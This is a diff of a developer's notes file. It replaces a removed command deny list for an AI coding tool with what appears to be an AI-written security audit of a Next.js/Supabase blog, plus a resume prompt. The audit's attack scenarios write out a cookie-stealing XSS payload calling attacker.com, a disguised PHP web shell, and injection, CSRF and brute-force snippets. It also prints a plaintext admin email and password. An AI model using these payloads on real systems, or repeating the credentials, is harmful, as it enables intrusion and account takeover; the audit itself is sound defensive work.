@@ -1,91 +1,586 @@
 
-・DB実装完了後、必ずセキュリティ監査
-→システム側でのチェックだけでなく、supabase管理画面での設定の黙示確認なども含めて、
-必要な作業を洗い出し、テストを徹底的に行う。
------
-Authentication > URL Configuration
-・redirect urlが設定されていない
-Database > Replication
-primary databaseという部品みたいなものから、iceberg-3table,BigQuery-5tableに線が伸びている
+🔒 最終セキュリティ監査レポート                                                                                                                      
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  ■ 重大リスク（High）                                                                                                                                 
+                                                                                                                                                       
+  🔴 1. 環境変数ファイルの平文パスワード保存                                                                                                           
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  .env.local に管理者パスワードが平文で記載されています（ADMIN_PASSWORD=mokosau1216）。コードでは使用されていませんが、Git履歴に残っている場合、リポジ 
+  トリが公開されると誰でもアクセス可能になります。                                                                                                     
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  1. GitHubで公開リポジトリを発見                                                                                                                      
+  2. .env.local の履歴を確認                                                                                                                           
+  3. ADMIN_EMAIL=dafuzuomu9@gmail.com と ADMIN_PASSWORD=mokosau1216 を取得                                                                             
+  4. Supabase Authで直接ログイン                                                                                                                       
+  5. 管理画面から記事の改ざん、削除、フィッシングサイトへの誘導                                                                                        
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  # .env.local (L9-11)                                                                                                                                 
+  ADMIN_EMAIL=dafuzuomu9@gmail.com                                                                                                                     
+  ADMIN_PASSWORD=mokosau1216                                                                                                                           
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  # 1. .env.local から削除（使用されていないため）                                                                                                     
+  # 2. Git履歴から完全削除（git filter-branch）                                                                                                        
+  # 3. Supabase で管理者パスワードを変更                                                                                                               
+  # 4. .gitignore の確認                                                                                                                               
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🔴 2. Stored XSS（永続的クロスサイトスクリプティング）                                                                                               
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  ブログ記事、ポートフォリオ、サンドボックスの詳細ページで dangerouslySetInnerHTML を使用しているが、サニタイズ処理が一切ありません。                  
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  1. 管理者が（意図せず）悪意あるHTMLを含む記事を作成                                                                                                  
+  2. 訪問者がその記事を閲覧                                                                                                                            
+  3. 以下のスクリプトが実行される:                                                                                                                     
+  <img src=x onerror="                                                                                                                                 
+    // セッションCookieを盗む                                                                                                                          
+    fetch('https://attacker.com/steal?c='+document.cookie);                                                                                            
+                                                                                                                                                       
+    // 全訪問者にマルウェアを配布                                                                                                                      
+    document.body.innerHTML += '<iframe src=https://malware.com>';                                                                                     
+  ">                                                                                                                                                   
+  4. 訪問者のセッションが乗っ取られる、個人情報が盗まれる                                                                                              
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/app/blog/[slug]/page.tsx:106-110                                                                                                              
+  {post.content && (                                                                                                                                   
+    <div                                                                                                                                               
+      className="prose prose-lg dark:prose-invert max-w-none mb-12"                                                                                    
+      dangerouslySetInnerHTML={{ __html: post.content }}                                                                                               
+    />                                                                                                                                                 
+  )}                                                                                                                                                   
+                                                                                                                                                       
+  同様の箇所: portfolio/[id]/page.tsx:90-95, sandbox/[id]/page.tsx:96-101                                                                              
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  npm install dompurify isomorphic-dompurify                                                                                                           
+  npm install --save-dev @types/dompurify                                                                                                              
+                                                                                                                                                       
+  import DOMPurify from 'isomorphic-dompurify';                                                                                                        
+                                                                                                                                                       
+  {post.content && (                                                                                                                                   
+    <div                                                                                                                                               
+      className="prose prose-lg dark:prose-invert max-w-none mb-12"                                                                                    
+      dangerouslySetInnerHTML={{                                                                                                                       
+        __html: DOMPurify.sanitize(post.content, {                                                                                                     
+          ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',                                                           
+                         'ul', 'ol', 'li', 'a', 'img', 'blockquote', 'code', 'pre'],                                                                   
+          ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],                                                                                      
+          ALLOW_DATA_ATTR: false                                                                                                                       
+        })                                                                                                                                             
+      }}                                                                                                                                               
+    />                                                                                                                                                 
+  )}                                                                                                                                                   
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🔴 3. 認証バイパス可能な未使用の管理画面ページ                                                                                                       
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  /src/app/admin/page.tsx に認証チェックのない管理画面が存在します。現在は /admin/login/page.tsx                                                       
+  が使用されていますが、旧実装が残っており混乱を招きます。                                                                                             
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  1. /admin にアクセス                                                                                                                                 
+  2. フォーム送信すると認証なしで /admin/dashboard に遷移                                                                                              
+  3. （現状は /admin/dashboard で認証チェックがあるため阻止されるが、設計ミス）                                                                        
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/app/admin/page.tsx:37-40                                                                                                                      
+  const handleSubmit = (e: React.FormEvent) => {                                                                                                       
+    e.preventDefault();                                                                                                                                
+    console.log("Login form submitted");                                                                                                               
+    window.location.href = "/admin/dashboard"; // 認証なし                                                                                             
+  };                                                                                                                                                   
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  # 不要なファイルを削除                                                                                                                               
+  rm src/app/admin/page.tsx                                                                                                                            
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  ■ 中リスク（Medium）                                                                                                                                 
+                                                                                                                                                       
+  🟡 4. ファイルアップロードの検証不足                                                                                                                 
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  MIMEタイプがクライアント側で検証されているだけで、サーバー側でファイル内容の検証がありません。                                                       
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  // 悪意のあるSVGファイルをアップロード                                                                                                               
+  const maliciousSVG = new File([                                                                                                                      
+    '<svg onload="alert(document.cookie)"><text>XSS</text></svg>'                                                                                      
+  ], 'innocent.svg', { type: 'image/svg+xml' });                                                                                                       
+                                                                                                                                                       
+  // または、PHPシェルを画像として偽装                                                                                                                 
+  const shell = new File([                                                                                                                             
+    '<?php system($_GET["cmd"]); ?>',                                                                                                                  
+    '\xFF\xD8\xFF\xE0' // JPEG Magic Bytes を先頭に追加                                                                                                
+  ], 'avatar.jpg', { type: 'image/jpeg' });                                                                                                            
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/lib/utils/upload.ts:11-15                                                                                                                     
+  export function validateImageFile(file: File, maxSizeMB: number = 5) {                                                                               
+    const validTypes = ["image/jpeg", "image/jpg", "image/png", "image/webp", "image/gif"];                                                            
+                                                                                                                                                       
+    if (!validTypes.includes(file.type)) { // ← クライアント側の値を信頼                                                                               
+      return { valid: false, error: "..." };                                                                                                           
+    }                                                                                                                                                  
+  }                                                                                                                                                    
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  // サーバー側でMagic Bytesを検証                                                                                                                     
+  async function validateImageMagicBytes(buffer: ArrayBuffer): Promise<boolean> {                                                                      
+    const bytes = new Uint8Array(buffer);                                                                                                              
+                                                                                                                                                       
+    // PNG: 89 50 4E 47                                                                                                                                
+    if (bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4E && bytes[3] === 0x47) {                                                            
+      return true;                                                                                                                                     
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // JPEG: FF D8 FF                                                                                                                                  
+    if (bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {                                                                                 
+      return true;                                                                                                                                     
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // WebP: 52 49 46 46 ... 57 45 42 50                                                                                                               
+    if (bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {                                                          
+      return true;                                                                                                                                     
+    }                                                                                                                                                  
+                                                                                                                                                       
+    return false;                                                                                                                                      
+  }                                                                                                                                                    
+                                                                                                                                                       
+  // 拡張子のホワイトリスト検証も追加                                                                                                                  
+  const allowedExtensions = ['jpg', 'jpeg', 'png', 'webp'];                                                                                            
+  const ext = file.name.split('.').pop()?.toLowerCase();                                                                                               
+  if (!ext || !allowedExtensions.includes(ext)) {                                                                                                      
+    throw new Error('許可されていない拡張子です');                                                                                                     
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🟡 5. Slugの入力検証不足（Path Traversal の可能性）                                                                                                  
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  Slugのバリデーションがクライアント側のみで、サーバー側で再検証していません。                                                                         
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  // ブラウザのDevToolsでバリデーションを無効化                                                                                                        
+  fetch('/api/admin/blog', {                                                                                                                           
+    method: 'POST',                                                                                                                                    
+    headers: { 'Content-Type': 'application/json' },                                                                                                   
+    body: JSON.stringify({                                                                                                                             
+      title: 'Test',                                                                                                                                   
+      slug: '../../../etc/passwd',  // Path Traversal試行                                                                                              
+      content: 'Test'                                                                                                                                  
+    })                                                                                                                                                 
+  });                                                                                                                                                  
+                                                                                                                                                       
+  // または予約語を使用                                                                                                                                
+  { slug: 'admin' }  // /blog/admin にアクセスすると管理画面と競合                                                                                     
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/app/admin/blog/BlogPostForm.tsx:188-191                                                                                                       
+  pattern: {                                                                                                                                           
+    value: /^[a-z0-9\-_\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FAF]+$/,                                                                                    
+    message: "英数字、ハイフン、アンダースコア、日本語のみ使用できます"                                                                                
+  }                                                                                                                                                    
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  // src/app/api/admin/blog/route.ts                                                                                                                   
+  export async function POST(request: NextRequest) {                                                                                                   
+    const data = await request.json();                                                                                                                 
+                                                                                                                                                       
+    // 1. サーバーサイドでの厳密なバリデーション                                                                                                       
+    const slugRegex = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;                                                                                                    
+    if (!data.slug || !slugRegex.test(data.slug)) {                                                                                                    
+      return NextResponse.json(                                                                                                                        
+        { error: 'スラッグの形式が不正です' },                                                                                                         
+        { status: 400 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // 2. 予約語のブロック                                                                                                                             
+    const reservedSlugs = ['admin', 'api', 'auth', '_next', 'public'];                                                                                 
+    if (reservedSlugs.includes(data.slug)) {                                                                                                           
+      return NextResponse.json(                                                                                                                        
+        { error: 'このスラッグは予約されています' },                                                                                                   
+        { status: 400 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // 3. 長さ制限                                                                                                                                     
+    if (data.slug.length > 100) {                                                                                                                      
+      return NextResponse.json(                                                                                                                        
+        { error: 'スラッグが長すぎます' },                                                                                                             
+        { status: 400 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🟡 6. エラーメッセージからの情報漏洩                                                                                                                 
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  データベースエラーをそのまま返しており、内部実装の詳細が露出します。                                                                                 
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  // 意図的にエラーを発生させて内部情報を収集                                                                                                          
+  fetch('/api/admin/blog', {                                                                                                                           
+    method: 'POST',                                                                                                                                    
+    body: JSON.stringify({                                                                                                                             
+      title: "'; DROP TABLE users; --",  // SQLインジェクション試行                                                                                    
+      slug: 'test'                                                                                                                                     
+    })                                                                                                                                                 
+  })                                                                                                                                                   
+  .then(r => r.json())                                                                                                                                 
+  .then(data => {                                                                                                                                      
+    console.log(data.error);                                                                                                                           
+    // -> "記事の作成に失敗しました: duplicate key value violates unique constraint 'blog_posts_slug_key'"                                             
+    // テーブル名、カラム名、制約名が露出                                                                                                              
+  });                                                                                                                                                  
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/app/api/admin/blog/route.ts:66-69                                                                                                             
+  if (error instanceof Error) {                                                                                                                        
+    return NextResponse.json(                                                                                                                          
+      { error: `記事の作成に失敗しました: ${error.message}` },                                                                                         
+      { status: 500 }                                                                                                                                  
+    );                                                                                                                                                 
+  }                                                                                                                                                    
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  catch (error) {                                                                                                                                      
+    // サーバーログに詳細を記録（本番環境でも）                                                                                                        
+    console.error('[API Error] Blog post creation failed:', {                                                                                          
+      error,                                                                                                                                           
+      timestamp: new Date().toISOString(),                                                                                                             
+      user: authResult.user?.email,                                                                                                                    
+    });                                                                                                                                                
+                                                                                                                                                       
+    // 本番環境では汎用的なメッセージのみ返す                                                                                                          
+    if (process.env.NODE_ENV === 'production') {                                                                                                       
+      return NextResponse.json(                                                                                                                        
+        { error: '記事の作成に失敗しました。しばらく経ってから再度お試しください。' },                                                                 
+        { status: 500 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // 開発環境のみ詳細を返す                                                                                                                          
+    if (error instanceof Error) {                                                                                                                      
+      return NextResponse.json(                                                                                                                        
+        { error: `記事の作成に失敗しました: ${error.message}` },                                                                                       
+        { status: 500 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🟡 7. CSRF（クロスサイトリクエストフォージェリ）対策不足                                                                                             
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  CSRFトークンの検証がなく、認証済みユーザーに対する攻撃が可能です。                                                                                   
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  <!-- 攻撃者のサイト evil.com -->                                                                                                                     
+  <html>                                                                                                                                               
+  <body onload="document.forms[0].submit()">                                                                                                           
+    <form action="https://victim-blog.vercel.app/api/admin/blog/123" method="POST">                                                                    
+      <input type="hidden" name="published" value="false">                                                                                             
+      <input type="hidden" name="title" value="Hacked!">                                                                                               
+    </form>                                                                                                                                            
+  </body>                                                                                                                                              
+  </html>                                                                                                                                              
+                                                                                                                                                       
+  <!-- 管理者がこのページを開くと、記事が勝手に非公開になる -->                                                                                        
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  全APIルートでCSRFトークンのチェックなし                                                                                                              
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  // middleware.ts または各APIルート                                                                                                                   
+  export async function POST(request: NextRequest) {                                                                                                   
+    // 1. Originヘッダーのチェック                                                                                                                     
+    const origin = request.headers.get('origin');                                                                                                      
+    const host = request.headers.get('host');                                                                                                          
+                                                                                                                                                       
+    if (origin && new URL(origin).host !== host) {                                                                                                     
+      return NextResponse.json(                                                                                                                        
+        { error: 'Invalid origin' },                                                                                                                   
+        { status: 403 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // 2. Next.jsのSameSite Cookie設定を確認                                                                                                           
+    // Supabaseのセッションクッキーが SameSite=Lax または Strict であることを確認                                                                      
+                                                                                                                                                       
+    // 既存の処理...                                                                                                                                   
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🟡 8. レート制限なし（DoS / Brute Force 攻撃）                                                                                                       
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  API呼び出しに制限がなく、無限にリクエストを送信できます。                                                                                            
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  // ブルートフォース攻撃                                                                                                                              
+  const passwords = ['password', '123456', 'admin', ...];                                                                                              
+  for (const pwd of passwords) {                                                                                                                       
+    await fetch('/api/auth/login', {                                                                                                                   
+      method: 'POST',                                                                                                                                  
+      body: JSON.stringify({                                                                                                                           
+        email: 'admin@example.com',                                                                                                                    
+        password: pwd                                                                                                                                  
+      })                                                                                                                                               
+    });                                                                                                                                                
+  }                                                                                                                                                    
+                                                                                                                                                       
+  // DoS攻撃                                                                                                                                           
+  while (true) {                                                                                                                                       
+    fetch('/api/admin/blog', {                                                                                                                         
+      method: 'POST',                                                                                                                                  
+      body: JSON.stringify({ title: 'spam', slug: Math.random() })                                                                                     
+    });                                                                                                                                                
+  }                                                                                                                                                    
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  全APIルートでレート制限なし                                                                                                                          
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  // Vercelの無料プランでは Upstash Redis を推奨                                                                                                       
+  import { Ratelimit } from "@upstash/ratelimit";                                                                                                      
+  import { Redis } from "@upstash/redis";                                                                                                              
+                                                                                                                                                       
+  const ratelimit = new Ratelimit({                                                                                                                    
+    redis: Redis.fromEnv(),                                                                                                                            
+    limiter: Ratelimit.slidingWindow(10, "10s"), // 10秒あたり10リクエスト                                                                             
+    analytics: true,                                                                                                                                   
+  });                                                                                                                                                  
+                                                                                                                                                       
+  export async function POST(request: NextRequest) {                                                                                                   
+    const ip = request.ip ?? request.headers.get('x-forwarded-for') ?? 'unknown';                                                                      
+    const { success, limit, reset, remaining } = await ratelimit.limit(ip);                                                                            
+                                                                                                                                                       
+    if (!success) {                                                                                                                                    
+      return NextResponse.json(                                                                                                                        
+        {                                                                                                                                              
+          error: 'リクエストが多すぎます。しばらく経ってから再度お試しください。',                                                                     
+          retryAfter: Math.ceil((reset - Date.now()) / 1000)                                                                                           
+        },                                                                                                                                             
+        { status: 429 }                                                                                                                                
+      );                                                                                                                                               
+    }                                                                                                                                                  
+                                                                                                                                                       
+    // 既存の処理...                                                                                                                                   
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  ■ 低リスク（Low）                                                                                                                                    
+                                                                                                                                                       
+  🟢 9. デバッグログの残存（本番環境での情報漏洩）                                                                                                     
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  console.log でデバッグ情報を出力しており、本番環境で機密情報が漏洩する可能性があります。                                                             
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  ブラウザのコンソールまたはサーバーログから以下の情報を取得:                                                                                          
+  // ブラウザコンソールに表示される                                                                                                                    
+  console.log("Received profile update request:", {                                                                                                    
+    email: "admin@example.com",                                                                                                                        
+    avatar_url: "https://...",                                                                                                                         
+    // 全てのプロフィール情報が露出                                                                                                                    
+  });                                                                                                                                                  
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  // src/app/api/admin/profile/route.ts:38, 50, 61                                                                                                     
+  console.log("Received profile update request:", body);                                                                                               
+  console.log("Current profile ID:", currentProfile?.id);                                                                                              
+  console.log("Profile updated successfully:", updatedProfile);                                                                                        
+                                                                                                                                                       
+  // src/lib/api/profile.ts:24, 50, 64                                                                                                                 
+  console.log("Fetched profile:", data);                                                                                                               
+  console.log("Updating profile with ID:", id, "Data:", profile);                                                                                      
+  console.log("Profile updated in DB:", data);                                                                                                         
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  # 本番ビルド時にconsole.logを自動削除                                                                                                                
+  npm install --save-dev babel-plugin-transform-remove-console                                                                                         
+                                                                                                                                                       
+  # または、開発環境でのみログ出力                                                                                                                     
+  if (process.env.NODE_ENV === 'development') {                                                                                                        
+    console.log("Debug info:", data);                                                                                                                  
+  }                                                                                                                                                    
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  🟢 10. セキュリティヘッダーの欠如                                                                                                                    
+                                                                                                                                                       
+  概要:                                                                                                                                                
+  XSS、クリックジャッキング、MITMなどを防ぐセキュリティヘッダーが設定されていません。                                                                  
+                                                                                                                                                       
+  悪用シナリオ（攻撃者視点）:                                                                                                                          
+  <!-- 攻撃者のサイト -->                                                                                                                              
+  <iframe src="https://victim-blog.vercel.app/admin/dashboard"></iframe>                                                                               
+  <!-- クリックジャッキング: 管理画面を透明なiframeで表示し、ユーザーを騙してクリックさせる -->                                                        
+                                                                                                                                                       
+  該当コード or 設計パターン:                                                                                                                          
+  next.config.mjs にセキュリティヘッダーの設定なし                                                                                                     
+                                                                                                                                                       
+  修正方針（具体）:                                                                                                                                    
+  // next.config.mjs                                                                                                                                   
+  const nextConfig = {                                                                                                                                 
+    async headers() {                                                                                                                                  
+      return [                                                                                                                                         
+        {                                                                                                                                              
+          source: '/:path*',                                                                                                                           
+          headers: [                                                                                                                                   
+            { key: 'X-Frame-Options', value: 'DENY' },                                                                                                 
+            { key: 'X-Content-Type-Options', value: 'nosniff' },                                                                                       
+            { key: 'X-XSS-Protection', value: '1; mode=block' },                                                                                       
+            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },                                                                      
+            {                                                                                                                                          
+              key: 'Permissions-Policy',                                                                                                               
+              value: 'camera=(), microphone=(), geolocation=()'                                                                                        
+            },                                                                                                                                         
+            {                                                                                                                                          
+              key: 'Strict-Transport-Security',                                                                                                        
+              value: 'max-age=31536000; includeSubDomains; preload',                                                                                   
+            },                                                                                                                                         
+            {                                                                                                                                          
+              key: 'Content-Security-Policy',                                                                                                          
+              value: [                                                                                                                                 
+                "default-src 'self'",                                                                                                                  
+                "script-src 'self' 'unsafe-inline' 'unsafe-eval'",                                                                                     
+                "style-src 'self' 'unsafe-inline'",                                                                                                    
+                "img-src 'self' data: https://tkjpmtqihzaqbundevhu.supabase.co",                                                                       
+                "font-src 'self' data:",                                                                                                               
+                "connect-src 'self' https://tkjpmtqihzaqbundevhu.supabase.co",                                                                         
+                "frame-ancestors 'none'",                                                                                                              
+              ].join('; '),                                                                                                                            
+            },                                                                                                                                         
+          ],                                                                                                                                           
+        },                                                                                                                                             
+      ];                                                                                                                                               
+    },                                                                                                                                                 
+    // 既存の設定...                                                                                                                                   
+  };                                                                                                                                                   
+                                                                                                                                                       
+  ---                                                                                                                                                  
+  ■ セキュリティ的に良い実装（評価）                                                                                                                   
+                                                                                                                                                       
+  ✅ 1. Supabase RLS（Row Level Security）への依存                                                                                                     
+                                                                                                                                                       
+  - Supabase Auth でセッション管理                                                                                                                     
+  - データベースアクセスは RLS で保護                                                                                                                  
+  - Service Role Key を使用せず、Anon Key + RLS の組み合わせ                                                                                           
+  - 評価: セキュアな設計。ただし、RLS ポリシーの定期的なレビューが必要                                                                                 
+                                                                                                                                                       
+  ✅ 2. サーバーサイドでの認証チェック                                                                                                                 
+                                                                                                                                                       
+  - checkAdminAuth() が全APIルートで使用されている                                                                                                     
+  - cookies() を使用してサーバーサイドで動作                                                                                                           
+  - クライアント側での権限判定に依存していない                                                                                                         
+  - 評価: 適切な実装                                                                                                                                   
+                                                                                                                                                       
+  ✅ 3. 環境変数の適切な分離                                                                                                                           
+                                                                                                                                                       
+  - NEXT_PUBLIC_* は公開されても問題ない情報のみ                                                                                                       
+  - サーバーサイド専用の環境変数は NEXT_PUBLIC_ プレフィックスなし                                                                                     
+  - 評価: Next.js のベストプラクティスに準拠                                                                                                           
+                                                                                                                                                       
+  ✅ 4. TypeScript による型安全性                                                                                                                      
+                                                                                                                                                       
+  - 型定義ファイル（database.types.ts）の使用                                                                                                          
+  - Supabase の型との統合                                                                                                                              
+  - 評価: ランタイムエラーを防ぐ良い実装                                                                                                               
+                                                                                                                                                       
+  ✅ 5. HTTPSのみの画像ホスト                                                                                                                          
+                                                                                                                                                       
+  - next.config.mjs で Supabase のホスト名のみ許可                                                                                                     
+  - プロトコルも https に限定                                                                                                                          
+  - 評価: MITM攻撃を防ぐ良い設定                                                                                                                       
+                                                                                                                                                       
+  ---                                  
 
- Project Settings > API
- ・Publishable key、Secret keysが表示されている
 
-  Project Settings > General
-  ・特に設定されていなさそう
+■ 本番公開前チェックリスト                                                                                                     
+                                                                                                                                 
+  🔒 必須対応（Critical - これを満たさないと公開してはいけない）                                                                 
+                                                                                                                                 
+  - .env.local をGit履歴から完全削除                                                                                             
+  - 管理者パスワードを Supabase で変更（強力なパスワードに）                                                                     
+  - NEXTAUTH_SECRET を再生成（openssl rand -base64 32）                                                                          
+  - XSS対策: DOMPurify を導入して dangerouslySetInnerHTML を安全化                                                               
+  - /src/app/admin/page.tsx を削除                                                                                               
+  - 全 console.log を削除または環境変数で制御                                                                                    
+  - セキュリティヘッダーを next.config.mjs に追加                                                                                
+                                                                                                                                 
+  🔧 推奨対応（High - 可能な限り本番前に対応）                    
 
-  ----------
+                                                                                                                                 
+  - ファイルアップロードの Magic Bytes 検証を追加                                                                                
+  - Slug のサーバーサイドバリデーションを追加                                                                                    
+  - エラーメッセージを本番環境で汎用化                                                                                           
+  - CSRF対策（Originヘッダーチェック）を追加                                                                                     
+  - レート制限を導入（Upstash Ratelimit）                                                                                        
+                                                                                                                                 
+  📋 確認事項（Medium - 本番運用の安定性向上）                                                                                   
+                                                                                                                                 
+  - Supabase の RLS ポリシーを全テーブルで確認                                                                                   
+  -- 以下のコマンドでRLS有効化を確認                                                                                             
+  SELECT tablename, rowsecurity                                                                                                  
+  FROM pg_tables                                                                                                                 
+  WHERE schemaname = 'public';                                                                                                   
+  - Supabase Storage のバケットが Public になっているか確認                                                                      
+  - npm audit でセキュリティ脆弱性を確認                                                                                         
+  - Vercel の環境変数が正しく設定されているか確認                                                                                
+  - Cookie 設定（httpOnly, secure, sameSite）を確認                                                                              
+                                                                                                                                 
+  🧪 本番デプロイ後のテスト                                                                                                      
+                                                                                                                                 
+  - 管理画面にログインできるか                                                                                                   
+  - 一般ユーザーが管理画面にアクセスできないか                                                                                   
+  - 画像アップロードが機能するか                                                                                                 
+  - XSS攻撃を試みる（<script>alert('XSS')</script> を投稿）                                                                      
+  - HTTPS 接続が強制されているか                                                                                                 
+  - セキュリティヘッダーが返されているか（curl -I https://yoursite.com）                                                         
+                                                                                                                                 
+  ---                                                                                                                            
+  ■ 優先度付き修正ロードマップ                                                                                                   
+                                                                                                                                 
+  🚨 Phase 1: 緊急（今すぐ）                                                                                                     
+                                                                                                                                 
+  1. .env.local をGit履歴から削除 + 認証情報のローテーション                                                                     
+  2. XSS対策（DOMPurify導入）                                                                                                    
+  3. /src/app/admin/page.tsx 削除                                                                                                
+                                                                                                                                 
+  ⚠️ Phase 2: 本番公開前（1-2日以内）                                                                                            
+                                                                                                                                 
+  4. セキュリティヘッダーの追加                                                                                                  
+  5. ファイルアップロード検証の強化                                                                                              
+  6. Slugバリデーションの厳格化                                                                                                  
+  7. エラーメッセージの汎用化                                                                                                    
+  8. console.logの削除                                                                                                           
+                                                                                                                                 
+  📊 Phase 3: 本番公開直後（1週間以内）                                                                                          
+                                                                                                                                 
+  9. CSRF対策の追加                                                                                                              
+  10. レート制限の導入                                                                                                           
+  11. Supabase RLSポリシーの全面レビュー                                                                                         
+                                                                                                                                 
+  ---                                                                                                                            
+  最終評価: 現状では 本番公開は非推奨。Phase 1と Phase 2の対応完了後に公開すべき。                                               
+                                    
 
---bk20251218--
-
-{
-  "permissions": {
-    "deny": [
-      "Bash(git commit:*)",
-      "Bash(git push:*)",
-      "Bash(git pull:*)",
-      "Bash(git fetch:*)",
-      "Bash(git merge:*)",
-      "Bash(git rebase:*)",
-      "Bash(git reset:*)",
-      "Bash(git config:*)",
-      "Bash(sudo:*)",
-      "Bash(sudo *)",
-      "Bash(rm:*)",
-      "Bash(rm -rf:*)",
-      "Bash(rm -r:*)",
-      "Bash(rm -f:*)",
-      "Bash(rm -R:*)",
-      "Bash(rm --recursive:*)",
-      "Bash(rm --force:*)",
-      "Bash(rmdir:*)",
-      "Bash(find * -delete:*)",
-      "Bash(find * -exec rm:*)",
-      "Bash(xargs rm:*)",
-      "Bash(npm run dev)",
-      "Bash(npm run dev:*)",
-      "Bash(*npm run dev*)",
-      "Bash(npm start)",
-      "Bash(npm start:*)",
-      "Bash(*npm start*)",
-      "Bash(yarn dev)",
-      "Bash(yarn dev:*)",
-      "Bash(*yarn dev*)",
-      "Bash(yarn start)",
-      "Bash(yarn start:*)",
-      "Bash(*yarn start*)",
-      "Bash(pnpm dev)",
-      "Bash(pnpm dev:*)",
-      "Bash(*pnpm dev*)",
-      "Bash(pnpm start)",
-      "Bash(pnpm start:*)",
-      "Bash(*pnpm start*)",
-      "Bash(npm install:*)",
-      "Bash(npm install *)",
-      "Bash(npm i:*)",
-      "Bash(npm i *)",
-      "Bash(npm run build)",
-      "Bash(npm run build:*)",
-      "Bash(npm run test)",
-      "Bash(npm run test:*)",
-      "Bash(npm test)",
-      "Bash(npm test:*)",
-      "Bash(yarn install:*)",
-      "Bash(yarn add:*)",
-      "Bash(yarn build:*)",
-      "Bash(yarn test:*)",
-      "Bash(pnpm install:*)",
-      "Bash(pnpm add:*)",
-      "Bash(pnpm build:*)",
-      "Bash(pnpm test:*)",
-      "Bash(chmod 777:*)",
-      "Bash(chown:*)",
-      "Bash(curl * | sh:*)",
-      "Bash(curl * | bash:*)",
-      "Bash(wget * | sh:*)",
-      "Bash(wget * | bash:*)"
-    ]
-  }
-}
-
- 
+-----次回ここから再開プロンプト-----
+> - XSS対策: DOMPurify を導入して dangerouslySetInnerHTML を安全化                                                                                     
+  - /src/app/admin/page.tsx を削除                                                                                                                     
+  - 全 console.log を削除                                                                                                                              
+  - セキュリティヘッダーを next.config.mjs に追加            \                                                                                         
+\                                                                                                                                                      
+この方向で進めて     
+---------------------------------
